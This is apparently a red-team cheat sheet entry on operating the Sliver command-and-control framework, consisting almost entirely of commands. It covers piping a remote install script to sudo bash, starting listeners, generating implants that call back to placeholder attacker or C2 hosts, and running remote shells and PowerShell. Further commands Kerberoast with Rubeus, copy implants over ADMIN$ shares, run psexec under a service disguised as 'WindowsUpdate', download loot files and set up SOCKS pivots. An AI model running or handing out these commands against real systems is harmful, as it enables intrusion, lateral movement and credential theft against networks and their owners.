# 05.05 Sliver

> Go-based open-source C2 framework — modern Cobalt Strike alternative with mTLS, DNS, HTTP, WireGuard transports.

## Overview

Sliver is the most actively-developed open C2. Multi-operator (Multiplayer mode), cross-platform implants (Windows/Linux/macOS), multiple transports (mTLS, HTTP, DNS, WireGuard, NamedPipe), built-in evasion (sleep masks, indirect syscalls), Armory for extensions (BOFs, .NET assemblies, scripts). The default open-source C2 for engagements without Cobalt Strike license.

## Steps

* **Step 1** - Install via Linux one-liner.
* **Step 2** - Start sliver-server (interactive shell or daemon).
* **Step 3** - Configure listener(s) — HTTP/HTTPS/DNS/mTLS.
* **Step 4** - Generate implant.
* **Step 5** - Interact with sessions once implants check in.

## Commands

### Install

```bash
curl https://sliver.sh/install | sudo bash
# Start interactive
sudo sliver-server
```

### Start a listener

```bash
https --domain <C2-DOMAIN> --lport 443
http --lport 80
dns --domains <C2-DOMAIN> --no-canaries
mtls --lport 8888
wg --lport 53
```

### Generate implant

```bash
generate --http <C2-DOMAIN> --os windows --arch amd64 --format exe --save /opt/payloads/
generate --mtls <ATTACKER>:8888 --os linux --arch amd64 --format elf --save /opt/payloads/
generate beacon --http <C2-DOMAIN> --seconds 60 --jitter 30 --os windows --format exe
```

### Interact with session

```bash
sessions
use <SESSION-ID>
[host] $ getuid
[host] $ whoami
[host] $ shell                   # interactive shell
[host] $ execute -o powershell.exe -c whoami
[host] $ execute-assembly /opt/tools/Rubeus.exe kerberoast /nowrap
```

### File ops + lateral

```bash
[host] $ upload /opt/payloads/implant.exe \\<TARGET>\ADMIN$\implant.exe
[host] $ download C:\Users\<USER>\Documents\loot.txt
[host] $ psexec <TARGET-FQDN> --service-name 'WindowsUpdate' /opt/payloads/implant.exe
[host] $ pivots socks5 --bind 127.0.0.1 --lport 1080
```

### BOFs via armory

```bash
armory install --all     # install all extensions
use <SESSION>
[host] $ alias            # list available
[host] $ inline-execute /opt/bofs/whoami.x64.o
```

### Multiplayer setup

```bash
# On server
new-operator --name op1 --lhost <SERVER-IP>
# Saves config file; ship to operator
# Operator side:
sliver-client import op1.cfg
sliver-client
```
